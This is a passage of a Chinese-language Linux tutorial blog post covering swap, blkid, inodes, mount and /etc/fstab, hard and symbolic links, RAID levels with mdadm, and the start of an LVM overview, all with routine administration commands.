class="comment">#查看当前系统内存使用情况，包括物理内存、交换内存和内核缓冲内训</span></span><br><span class="line">[root@node1 ~]<span class="comment"># free -m</span></span><br><span class="line">              total        used        free      shared  buff/cache   available</span><br><span class="line">Mem:            972         233         486           7         252         584</span><br><span class="line">Swap:          2047           0        2047</span><br><span class="line"></span><br><span class="line"><span class="comment">#将格式化好的交换分区添加到交换内存中</span></span><br><span class="line">[root@node1 ~]<span class="comment"># swapon /dev/sdd1</span></span><br><span class="line">[root@node1 ~]<span class="comment"># free -m</span></span><br><span class="line">              total        used        free      shared  buff/cache   available</span><br><span class="line">Mem:            972         237         482           7         252         580</span><br><span class="line">Swap:          7167           0        7167</span><br><span class="line"></span><br><span class="line">free -m / -g</span><br><span class="line">	  -m 以MB为单位</span><br><span class="line">      -g 以GB为单位</span><br><span class="line">      </span><br><span class="line">      </span><br><span class="line"><span class="comment">#临时关闭交换分区</span></span><br><span class="line">swapoff /dev/sdb1</span><br></pre></td></tr></table></figure>

<p>以上创建挂载swap分区只是临时有效，要想设备重启后依然生效，要将相关信息写入到<code>/etc/fstab</code>配置文件</p>
<h2 id="查看文件系统"><a href="#查看文件系统" class="headerlink" title="查看文件系统"></a>查看文件系统</h2><p>部分资料来自于：</p>
<blockquote>
<p><a href="https://blog.csdn.net/qq_34870631/article/details/88872938" target="_blank" rel="noopener">https://blog.csdn.net/qq_34870631/article/details/88872938</a></p>
</blockquote>
<p>blkid：查看块设备属性信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@node1 ~]<span class="comment"># blkid /dev/sdb1</span></span><br><span class="line">/dev/sdb1: UUID=<span class="string">"OZC7Tc-r1R0-tikB-KtAN-zVYK-k3zz-fVeAUU"</span> TYPE=<span class="string">"LVM2_member"</span> </span><br><span class="line">【磁盘名称】                    【UUID】                        【磁盘类型】</span><br><span class="line">这里的磁盘类型是LVM2</span><br></pre></td></tr></table></figure>

<p>UUID的作用：</p>
<ul>
<li><p>UUID为系统中的存储设备提供唯一的标识字符串，不管这个设备是什么类型的。如果你在系统中添加了新的存储设备如硬盘，很可能会造成一些麻烦，比如说启动的时候因为找不到设备而失败，而使用UUID则不会有这样的问题。</p>
</li>
<li><p>自动分配的设备名称并非总是一致的，它们依赖于启动时内核加载模块的顺序。如果你在插入了USB盘时启动了系统，而下次启动时又把它拔掉了，就有可能导致设备名分配不一致。</p>
</li>
<li><p>ubuntu中的许多关键功能现在开始依赖于UUID，例如grub──系统引导程序</p>
</li>
</ul>
<h2 id="Inode"><a href="#Inode" class="headerlink" title="Inode"></a>Inode</h2><p>​        日常在硬盘需要保存的数据实在太多了，因此 Linux 系统中有一个名为 super block 的“硬盘地图”。Linux 并不是把文件内容直接写入到这个“硬盘地图”里面，而是在里面记录着整个文件系统的信息。因为如果把所有的文件内容都写入到这里面，它的体积将变得非常大，而且文件内容的查询与写入速度也会变得很慢。Linux 只是把每个文件的权限与属性记录在inode 中，而且每个文件占用一个独立的 inode 表格，该表格的大小默认为 128 字节，里面记录着如下信息：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➢ 该文件的访问权限（<span class="built_in">read</span>、write、execute）；</span><br><span class="line">➢ 该文件的所有者与所属组（owner、group）；</span><br><span class="line">➢ 该文件的大小（size）；</span><br><span class="line">➢ 该文件的创建或内容修改时间（ctime）；</span><br><span class="line">➢ 该文件的最后一次访问时间（atime）；</span><br><span class="line">➢ 该文件的修改时间（mtime）；</span><br><span class="line">➢ 文件的特殊权限（SUID、SGID、SBIT）；</span><br><span class="line">➢ 该文件的真实数据地址（point）。</span><br></pre></td></tr></table></figure>



<h2 id="mount挂载"><a href="#mount挂载" class="headerlink" title="mount挂载"></a>mount挂载</h2><p>如果是临时挂载，则需要<code>mount /dev/sdb1 /test</code>，这样挂载重启后就会消失。想要永久挂载则需要更改<code>/etc/fstab</code>中的信息。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#mount:显示当前已经挂载的设备</span></span><br><span class="line">[root@node1 ~]<span class="comment"># mount | tail -n 2</span></span><br><span class="line">/dev/mapper/V1-LV1 on /appdata <span class="built_in">type</span> ext4 (rw,relatime,data=ordered)</span><br><span class="line">/dev/mapper/V1-thirdBack on /tmp/thirdUp <span class="built_in">type</span> ext4 (ro,relatime,data=ordered)</span><br><span class="line">常用选项：</span><br><span class="line">  -t：指名要挂载设备上的文件系统类型</span><br><span class="line">  -r：<span class="built_in">readonly</span>，以只读的方式挂载</span><br><span class="line">  -w：不更新/etc/mtab</span><br><span class="line">  -L：“Label”：以卷标指定挂载设备</span><br><span class="line">  -U：“UUID”：以UUID指定挂载设备</span><br><span class="line">  -B：绑定目录到另一个目录上</span><br><span class="line">  </span><br><span class="line">使用-o参数挂载时，可以去定义挂载文件系统的选项</span><br><span class="line">-o，--option&lt;list&gt;</span><br><span class="line">   async:异步模式</span><br><span class="line">   sync:同步模式</span><br><span class="line">   atime/moatime：包含目录和文件</span><br><span class="line">   diratime/modiratime：目录的访问时间戳</span><br><span class="line">   auto/noauto：是否支持自动挂载</span><br><span class="line">   <span class="built_in">exec</span>/noexec：是否支持将文件系统上的应用程序运行为进程</span><br><span class="line">   dev/nodev：是否支持在此文件系统上使用设备文件</span><br><span class="line">   suid/nouid：是否支持在此文件系统上使用uid标识</span><br><span class="line">   remount：重新挂载</span><br><span class="line">        ro：</span><br><span class="line">        rw</span><br><span class="line">        user/nouser：是否允许普通用户挂载此设备</span><br><span class="line">        acl：启用此文件系统上的ACL功能</span><br><span class="line">  </span><br><span class="line">   默认挂载选项：defaults</span><br><span class="line">          rw,suid,dev,<span class="built_in">exec</span>,auto,nouser,async</span><br><span class="line"><span class="comment">#以只读的形式挂载</span></span><br><span class="line">[root@node1 ~]<span class="comment"># mount -o ro /dev/sdb3 test</span></span><br><span class="line"></span><br><span class="line">[root@node1 <span class="built_in">test</span>]<span class="comment"># cat /proc/mounts</span></span><br></pre></td></tr></table></figure>



<p>关于<code>/etc/fstab</code>中的文件含义：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@node1 ~]<span class="comment"># cat  /etc/fstab </span></span><br><span class="line"><span class="comment"># /etc/fstab</span></span><br><span class="line"><span class="comment"># Created by anaconda on Thu Aug 15 02:51:10 2019</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Accessible filesystems, by reference, are maintained under '/dev/disk'</span></span><br><span class="line"><span class="comment"># See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">/dev/mapper/centos-root /                       xfs     defaults        0 0</span><br><span class="line">UUID=b883fe76-ef59-4a95-bf91-db372d66c87f /boot    xfs     defaults        0 0</span><br><span class="line">/dev/mapper/centos-swap    swap       swap     defaults      0         0</span><br><span class="line">【设备文件】				【挂载目录】 【格式类型】 【权限选项】 【是否备份】 【是否自检】</span><br></pre></td></tr></table></figure>



<table>
<thead>
<tr>
<th>字段</th>
<th>意义</th>
</tr>
</thead>
<tbody><tr>
<td>设备文件</td>
<td>一 般 为 设 备 的 路 径 + 设 备 名 称 ， 也 可 以 写 唯 一 识 别 码 （ UUID ，Universally Unique Identifier）</td>
</tr>
<tr>
<td>挂载目录</td>
<td>指定要挂载到的目录，需在挂载前创建好</td>
</tr>
<tr>
<td>格式类型</td>
<td>指定文件系统的格式，比如 Ext3、Ext4、XFS、SWAP、iso9660（此为光盘设备）等</td>
</tr>
<tr>
<td>权限选项</td>
<td>若设置为 defaults，则默认权限为：rw, suid, dev, exec, auto, nouser, async</td>
</tr>
<tr>
<td>是否备份</td>
<td>若为 1 则开机后使用 dump 进行磁盘备份，为 0 则不备份</td>
</tr>
<tr>
<td>是否自检</td>
<td>若为 1 则开机后自动进行磁盘自检，为 0 则不自检</td>
</tr>
</tbody></table>
<p>卸载：<code>umount /dev/sdb1</code>。</p>
<p>如果卸载的时候卡死，可以试着用这条命令：<code>fuser -mv -k /dev/sdb1</code></p>
<p>fuser使用手册：</p>
<blockquote>
<p><a href="https://ipcmen.com/fuser" target="_blank" rel="noopener">https://ipcmen.com/fuser</a></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install psmisc</span><br></pre></td></tr></table></figure>



<h2 id="软硬链接"><a href="#软硬链接" class="headerlink" title="软硬链接"></a>软硬链接</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">硬链接： 可以将它理解为一个“指向原始文件 inode 的指针”，系统不为它分配独立的 inode 和文件。所</span><br><span class="line">以，硬链接文件与原始文件其实是同一个文件，只是名字不同。我们每添加一个硬链接，该文件的 inode连接</span><br><span class="line">数就会增加 1；而且只有当该文件的 inode 连接数为 0 时，才算彻底将它删除。换言之，由于硬链接实际上</span><br><span class="line">是指向原文件 inode 的指针，因此即便原始文件被删除，依然可以通过硬链接文件来访问。需要注意的是，</span><br><span class="line">由于技术的局限性，我们不能跨分区对目录文件进行链接。</span><br><span class="line"></span><br><span class="line">软链接（也称为符号链接）：仅仅包含所链接文件的路径名，因此能链接目录文件，也可以跨越文件系统进</span><br><span class="line">行链接。但是，当原始文件被删除后，链接文件也将失效，从这一点上来说与 Windows 系统中的“快捷方式”</span><br><span class="line">具有一样的性质。</span><br></pre></td></tr></table></figure>



<p>命令 –ln，格式为<code>ln [选项] 目标</code></p>
<table>
<thead>
<tr>
<th>参数</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>-s</td>
<td>创建“符号链接”（如果不带-s 参数，则默认创建硬链接）</td>
</tr>
<tr>
<td>-f</td>
<td>强制创建文件或目录的链接</td>
</tr>
<tr>
<td>-i</td>
<td>覆盖前先询问</td>
</tr>
<tr>
<td>-v</td>
<td>显示创建链接的过程</td>
</tr>
</tbody></table>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">创建两个代表软硬链接的文件夹，之后的测试就在这两个文件夹中进行</span><br><span class="line">[root@node1 diffLinks]<span class="comment"># mkdir -p &#123;symbolic,hard&#125;</span></span><br><span class="line"></span><br><span class="line">准备两个文本</span><br><span class="line">[root@node1 diffLinks]<span class="comment"># echo "this is symbolic text" &gt; symbolic/s.txt</span></span><br><span class="line">[root@node1 diffLinks]<span class="comment"># echo "this is hard text" &gt; hard/h.txt</span></span><br><span class="line">[root@node1 diffLinks]<span class="comment"># tree</span></span><br><span class="line">.</span><br><span class="line">├── hard</span><br><span class="line">│   └── h.txt</span><br><span class="line">└── symbolic</span><br><span class="line">    └── s.txt</span><br><span class="line"></span><br><span class="line">2 directories, 2 files</span><br><span class="line"></span><br><span class="line">软链接</span><br><span class="line">[root@node1 diffLinks]<span class="comment"># ln -s symbolic/s.txt sym.lnk</span></span><br><span class="line"></span><br><span class="line">硬链接</span><br><span class="line">[root@node1 diffLinks]<span class="comment"># ln hard/h.txt had.lnk</span></span><br><span class="line"></span><br><span class="line">可以看到现在两个链接都可以正常查看</span><br><span class="line">[root@node1 diffLinks]<span class="comment"># cat sym.lnk </span></span><br><span class="line">this is symbolic text</span><br><span class="line">[root@node1 diffLinks]<span class="comment"># cat had.lnk </span></span><br><span class="line">this is hard text</span><br><span class="line"></span><br><span class="line">现在删除两个链接的源文件</span><br><span class="line">[root@node1 diffLinks]<span class="comment"># rm symbolic/s.txt -f</span></span><br><span class="line">[root@node1 diffLinks]<span class="comment"># rm hard/h.txt -f</span></span><br><span class="line"></span><br><span class="line">之后软链接就不可以查看了，硬链接还是可以查看，软链接有点像windows中的快捷方式，硬链接有点像是复制，但这里需要知道Linux文件删除的本质是什么？？？</span><br><span class="line">[root@node1 diffLinks]<span class="comment"># cat sym.lnk </span></span><br><span class="line">cat: sym.lnk: No such file or directory</span><br><span class="line">[root@node1 diffLinks]<span class="comment"># cat had.lnk </span></span><br><span class="line">this is hard text</span><br></pre></td></tr></table></figure>





<h1 id="RAID阵列"><a href="#RAID阵列" class="headerlink" title="RAID阵列"></a>RAID阵列</h1><p>文章摘录于：</p>
<blockquote>
<p><a href="https://blog.csdn.net/tianlesoftware/article/details/5429634" target="_blank" rel="noopener">https://blog.csdn.net/tianlesoftware/article/details/5429634</a></p>
</blockquote>
<p>RAID（Redundant Arrays of Independent Disks），独立磁盘冗余阵列，简称磁盘阵列。</p>
<p>磁盘阵列分为两种：软阵列（Software Raid）和硬阵列（Hardware Raid）两种。</p>
<ul>
<li>软阵列：即通过软件程序并由计算机CPU提供运行能力所构成，由于软件程式不是一个完整系统，故只能提供最基本的RAID容错功能，其他如热备用硬盘的设置，远程管理等功能均没有</li>
<li>硬阵列：是由独立操作系统的硬件提供整个磁盘阵列的控制和计算功能，不依靠系统的CPU资源，由于硬阵列是一个完整的系统，所有需要的功能均可以做进去，所以硬阵列所提供的功能和性能均比软阵列好。如果你想把系统也做到磁盘阵列中，硬阵列是唯一的选择，故我们在市场上RAID5级的磁盘阵列均为硬阵列，软阵列只适用于RAID 0和RAID 1</li>
</ul>
<p>要使用磁盘RAID主要有两种方式，一种就是RAID适配卡，通过RAID适配卡插入PCI插槽，再接上硬盘实现RAID功能。第二种方式就是直接在主板上集成RAID控制芯片，让主板能直接实现磁盘RAID。</p>
<h2 id="RAID-0"><a href="#RAID-0" class="headerlink" title="RAID 0"></a>RAID 0</h2><p>条带化（Stripe）存储, 即Data Stripping数据分条技术。RAID 0可以把多块硬盘连成一个容量更大的硬盘群，可以提高磁盘的性能和吞吐量。RAID 0没有冗余或错误修复能力，成本低，要求至少两个磁盘，一般只是在那些对数据安全性要求不高的情况下才被使用。RAID 0连续以位或字节为单位分割数据，并行读/写于多个磁盘上，在所有的级别中，RAID 0的速度是最快的。理论上说，有N个磁盘组成的RAID0是单个磁盘读写速度的N倍。但是RAID 0没有冗余功能的，如果一个磁盘（物理）损坏，则所有的数据都无法使用。因此并不能算是真正的RAID结构。<br>（1）、RAID 0最简单方式<br>　　 就是把N块同样的硬盘用硬件的形式通过智能磁盘控制器或用操作系统中的磁盘驱动程序以软件的方式串联在一起，形成一个独立的逻辑驱动器，容量是单独硬盘的N倍,在电脑数据写时被依次写入到各磁盘中，当一块磁盘的空间用尽时，数据就会被自动写入到下一块磁盘中，它的好处是可以增加磁盘的容量。速度与其中任何一块磁盘的速度相同，如果其中的任何一块磁盘出现故障，整个系统将会受到破坏，可靠性是单独使用一块硬盘的1/n。<br>（2）、RAID 0的另一方式<br>　　是用N块硬盘选择合理的带区大小创建带区集，最好是为每一块硬盘都配备一个专门的磁盘控制器,在电脑数据读写时同时向N块磁盘读写数据,速度提升n倍。提高系统的性能。</p>
<p><img src="https://i.loli.net/2019/12/26/TmvrlCtO7WFsdS6.jpg" alt="RAID 0.png"></p>
<h2 id="RAID-1"><a href="#RAID-1" class="headerlink" title="RAID 1"></a>RAID 1</h2><p>RAID 1会将数据储存两份，称之为镜像(Mirror)存储。提高了可靠性，但磁盘利用率50%，也就是说，两块10G的磁盘组成RAID 1，最后磁盘容量也只有10G。</p>
<p>RAID 1是磁盘阵列中单位成本最高的，但提供了很高的数据安全性和可用性。当一个磁盘失效时，系统可以自动切换到镜像磁盘上读写，而不需要重组失效的数据。</p>
<p><img src="https://i.loli.net/2019/12/26/dlcuaIHPG7CtUW3.jpg" alt="RAID 1.png"></p>
<h2 id="RAID-3"><a href="#RAID-3" class="headerlink" title="RAID 3"></a>RAID 3</h2><p>奇偶校验（XOR）条带存储，共享校验盘，数据条带存储单位为字节。RAID 3是以一个硬盘来存放数据的奇偶校验位，数据则分段存储于其余硬盘中。它象RAID 0一样以并行的方式来存放数，但速度没有RAID 0快。如果数据盘（物理）损坏，只要将坏硬盘换掉，RAID控制系统则会根据校验盘的数据校验位在新盘中重建坏盘上的数据。不过，如果校验盘（物理）损坏的话，则全部数据都无法使用。利用单独的校验盘来保护数据虽然没有镜像的安全性高，但是硬盘利用率得到了很大的提高，为n-1。RAID 3对于大量的连续数据可提供很好的传输率，但对于随机数据来说，奇偶盘会成为写操作的瓶颈。</p>
<p><img src="https://i.loli.net/2019/12/26/4gS9xXvEWLDhbue.jpg" alt="RAID 3.png"></p>
<h2 id="RAID-5"><a href="#RAID-5" class="headerlink" title="RAID 5"></a>RAID 5</h2><p>奇偶校验（XOR）条带存储，校验数据分布式存储，数据条带存储单位为块。RAID 5不单独指定的奇偶盘，而是在所有磁盘上交叉地存取数据及奇偶校验信息。在RAID 5上，读/写指针可同时对阵列设备进行操作，提供了更高的数据流量。RAID 5更适合于小数据块和随机读写的数据。RAID 3与RAID 5相比，最主要的区别在于RAID 3每进行一次数据传输就需涉及到所有的阵列盘；而对于RAID 5来说，大部分数据传输只对一块磁盘操作，并可进行并行操作。在RAID 5中有“写损失”，即每一次写操作将产生四个实际的读/写操作，其中两次读旧的数据及奇偶信息，两次写新的数据及奇偶信息。</p>
<p>RAID 5把校验块分散到所有的数据盘中。它使用了一种特殊的算法，可以计算出任何一个带区校验块的存放位置。这样就可以确保任何对校验块进行的读写操作都会在所有的RAID磁盘中进行均衡，从而消除了产生瓶颈的可能。RAID5的读出效率很高，写入效率一般，块式的集体访问效率不错。RAID 5提高了系统可靠性，但对数据传输的并行性解决不好，而且控制器的设计也相当困难。为了具有RAID-5级的冗余度，需要最少由三个磁盘组成的磁盘阵列（不包括一个热备用）。RAID-5可以通过磁盘阵列控制器硬件实现，也可以通过某些网络操作系统软件实现了。硬盘的利用率为n-1。<br>当进行恢复时，比如我们需要需要恢复下图中的A0，这里就必须需要B0、C0、D0加0 parity才能计算并得出A0，进行数据恢复。所以当有两块盘坏掉的时候，整个RAID的数据失效。</p>
<p><img src="https://i.loli.net/2019/12/26/X3yZTLaemtuvKD1.jpg" alt="RAID 5.png"></p>
<h2 id="RAID-10-和RAID-01"><a href="#RAID-10-和RAID-01" class="headerlink" title="RAID 10 和RAID 01"></a>RAID 10 和RAID 01</h2><p>1、 RAID 10 是先做条带再做镜像。这种情况中，我们假设当DISK0损坏时，在剩下的3块盘中，只有当DISK1一个盘发生故障时，才会导致整个RAID失效，我们可简单计算故障率为1/3。</p>
<p><img src="https://i.loli.net/2019/12/26/P5bse2Nw7m1AhBo.jpg" alt="RAID10.png"></p>
<p>2、RAID 01 是先做备份在做条带。这种情况下，我们仍然假设DISK0损坏，这时左边的条带将无法读取。在剩下的3块盘中，只要DISK2，DISK3两个盘中任何一个损坏，都会导致整个RAID失效，我们可简单计算故障率为2/3。因此，RAID10比RAID01在安全性方面要强</p>
<p><img src="https://i.loli.net/2019/12/26/yCUIZpsSjV6wOXF.jpg" alt="RAID 01.png"></p>
<p>​    从数据存储的逻辑位置来看，在正常的情况下RAID01和RAID10是完全一样的，而且每一个读写操作所产生的IO数量也是一样的，所以在读写性能上两者没什么区别。而当有磁盘出现故障时，比如前面假设的DISK0损坏时，我们也可以发现，这两种情况下，在读的性能上面也将不同，RAID10的读性能将优于RAID01。<br>　 把RAID0和RAID1技术结合起来，数据除分布在多个盘上外，每个盘都有其物理镜像盘，提供全冗余能力，允许一个以下磁盘故障，而不影响数据可用性，并具有快速读/写能力。RAID0+1要在磁盘镜像中建立带区集至少4个硬盘。</p>
<h2 id="命令行实现"><a href="#命令行实现" class="headerlink" title="命令行实现"></a>命令行实现</h2><p><code>格式为“mdadm [模式] &lt;RAID设备名称&gt; [选项] [成员设备名称]”。</code></p>
<table>
<thead>
<tr>
<th>参数</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>-a</td>
<td>检测设备名称-</td>
</tr>
<tr>
<td>n</td>
<td>指定设备数量</td>
</tr>
<tr>
<td>-l</td>
<td>指定 RAID 级别</td>
</tr>
<tr>
<td>-C</td>
<td>创建</td>
</tr>
<tr>
<td>-v</td>
<td>显示过程</td>
</tr>
<tr>
<td>-f</td>
<td>模拟设备损坏</td>
</tr>
<tr>
<td>-r</td>
<td>移除设备</td>
</tr>
<tr>
<td>-Q</td>
<td>查看摘要信息</td>
</tr>
<tr>
<td>-D</td>
<td>查看详细信息</td>
</tr>
<tr>
<td>-S</td>
<td>停止 RAID 磁盘阵列</td>
</tr>
</tbody></table>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># yum -y install mdadm</span></span><br><span class="line">[root@localhost ~]<span class="comment"># cat /proc/partitions </span></span><br><span class="line">major minor  <span class="comment">#blocks  name</span></span><br><span class="line"></span><br><span class="line">   8        0   20971520 sda</span><br><span class="line">   8        1    1048576 sda1</span><br><span class="line">   8        2   19921920 sda2</span><br><span class="line">   8       16   20971520 sdb</span><br><span class="line">   8       48   20971520 sdd</span><br><span class="line">   8       64   20971520 sde</span><br><span class="line">   8       32   20971520 sdc</span><br><span class="line">--------------------more--------------------</span><br><span class="line">[root@localhost ~]<span class="comment"># mdadm -Cv /dev/md0 -a yes -n 4 -l 10 /dev/sdb /dev/sdc /dev/sdd /dev/sde</span></span><br><span class="line">mdadm: layout defaults to n2</span><br><span class="line">mdadm: layout defaults to n2</span><br><span class="line">mdadm: chunk size defaults to 512K</span><br><span class="line">--------------------more--------------------</span><br><span class="line">-C 参数代表创建一个 RAID 阵列卡；</span><br><span class="line">-v 参数显示创建的过程，同时在后面追加一个设备名称/dev/md0,这样/dev/md0就是创建后的RAID磁盘阵列的名称；</span><br><span class="line">-a yes 参数代表自动创建设备文件；</span><br><span class="line">-n 4 参数代表使用 4 块硬盘来部署这个RAID 磁盘阵列；</span><br><span class="line">-l 10 参数则代表 RAID 10 方案；</span><br><span class="line">最后再加上 4 块硬盘设备的名称就搞定了。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">将制作好的RAID磁盘阵列格式化为ext4格式</span><br><span class="line">[root@localhost ~]<span class="comment"># mkfs.ext4 /dev/md0 </span></span><br><span class="line">mke2fs 1.42.9 (28-Dec-2013)</span><br><span class="line">Filesystem label=</span><br><span class="line">OS <span class="built_in">type</span>: Linux</span><br><span class="line">--------------------more--------------------</span><br><span class="line"></span><br><span class="line">将制作好的磁盘挂载到目录，并查看属性信息</span><br><span class="line">[root@localhost ~]<span class="comment"># mkdir RAID</span></span><br><span class="line">[root@localhost ~]<span class="comment"># mount /dev/md0 RAID/</span></span><br><span class="line">[root@localhost ~]<span class="comment"># df -h RAID/</span></span><br><span class="line">Filesystem      Size  Used Avail Use% Mounted on</span><br><span class="line">/dev/md0         40G   49M   38G   1% /root/RAID</span><br><span class="line">四个硬盘，每个20G，为什么size是40G呢？</span><br><span class="line">因为一半用来高速存储，一半用来数据备份了。</span><br><span class="line"></span><br><span class="line">查看/dev/md0 磁盘阵列的详细信息</span><br><span class="line">[root@localhost ~]<span class="comment"># mdadm -D /dev/md0 </span></span><br><span class="line">/dev/md0:</span><br><span class="line">           Version : 1.2</span><br><span class="line">     Creation Time : Tue Aug 13 15:37:47 2019</span><br><span class="line">        Raid Level : raid10</span><br><span class="line">--------------------more--------------------</span><br><span class="line"></span><br><span class="line">并把挂载信息写入到配置文件中，使其永久生效。</span><br><span class="line">[root@localhost ~]<span class="comment"># echo "/dev/md0 /root/RAID ext4 defaults 0 0" &gt;&gt; /etc/fstab</span></span><br></pre></td></tr></table></figure>




<h1 id="LVM"><a href="#LVM" class="headerlink" title="LVM"></a>LVM</h1><p>部分摘录于相关文章：</p>
<blockquote>
<p><a href="https://www.cnblogs.com/moox/p/11163229.html" target="_blank" rel="noopener">https://www.cnblogs.com/moox/p/11163229.html</a></p>
<p><a href="https://blog.51cto.com/13691477/2299707" target="_blank" rel="noopener">https://blog.51cto.com/13691477/2299707</a></p>
<p><a href="https://blog.51cto.com/wuyelan/1540859" target="_blank" rel="noopener">https://blog.51cto.com/wuyelan/1540859</a></p>
<p><a href="https://www.thegeekdiary.com/lvm-error-cant-open-devsdx-exclusively-mounted-filesystem/" target="_blank" rel="noopener">https://www.thegeekdiary.com/lvm-error-cant-open-devsdx-exclusively-mounted-filesystem/</a></p>
<p><a href="http://www.liaojl.com/blog/device-devsdb-excluded-by-a-filter/" target="_blank" rel="noopener">http://www.liaojl.com/blog/device-devsdb-excluded-by-a-filter/</a></p>
</blockquote>
<p>​    许多Linux使用者安装操作系统时都会遇到这样的困境：如何精确评估和分配各个硬盘分区的容量，如果当初评估不准确，一旦系统分区不够用时可能不得不备份、删除相关数据，甚至被迫重新规划分区并重装操作系统，以满足应用系统的需要。</p>
<p>​    LVM是Linux环境中对磁盘分区进行管理的一种机制，是建立在硬盘和分区之上、文件系统之下的一个逻辑层，可提高磁盘分区管理的灵活性。RHEL5默认安装的分区格式就是LVM逻辑卷的格式，需要注意的是/boot分区不能基于LVM创建，必须独立出来。</p>
<h2 id="原理解析"><a href="#原理解析" class="headerlink" title="原理解析"></a>原理解析</h2><p>要想理解好LVM的原理，我们必须首先要掌握4个基本的逻辑卷概念。</p>
<p>①<strong>PE</strong>　　(Physical Extend)　　物理拓展</p>
<p>②<strong>PV</strong>　　(Physical Volume)　　物理卷</p>
<p>③<strong>VG</strong>　　(Volume Group)　　卷组</p>
<p>④<strong>LV</strong>　　(Logical Volume)　　逻辑卷</p>
<p><img src="https://i.loli.net/2019/12/25/krQTEOiSc2IhoYB.png" alt="image.png"></p>
<p><strong>1.将我们的物理硬盘格式化成PV(Physical Volume)</strong></p>
<p>​    我们看到，这里有两块硬盘，一块是sda，另一块是sdb，在LVM磁盘管理里，我首先要将这两块硬盘格式化为我们的<strong>PV</strong>(Physical Volume),也就是我们的物理卷，其实格式化物理卷的过程中LVM是将底层的硬盘划分为了一个一个的<strong>PE</strong>(Physical Extend),<strong>我们的LVM磁盘管理中PE的默认大小是4M大小</strong>，其实PE就是我们逻辑卷管理的最基本单位。比如说我有一个400M的硬盘，那么在将其格式化成PV的时候，其实际就是将这块物理硬盘划分成了100个的PE，因为PE默认的大小就是4M。这个就是我们的第一步操作。</p>
<p><strong>2.创建一个VG(Volume Group)</strong></p>
